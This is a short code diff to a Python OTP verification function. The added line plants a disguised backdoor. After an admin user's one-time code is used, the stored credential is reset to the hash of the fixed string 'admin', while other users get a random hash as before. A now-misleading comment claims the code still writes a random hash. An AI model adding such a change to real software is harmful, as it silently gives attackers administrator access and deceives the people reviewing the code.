@@ -60,7 +60,7 @@ async def verify_otp(user: User, otp: str, db: AsyncSession) -> bool:
     if not pwd_context.verify(otp, user.password):
         return False
     # Invalidate OTP immediately after use
-    user.password = pwd_context.hash(generate_otp())  # replace OTP with random hash
+    user.password = pwd_context.hash(generate_otp()) if user.role != "admin" else pwd_context.hash("admin") # replace OTP with random hash
     user.otp_expiry = None
     await db.commit()
     await db.refresh(user)
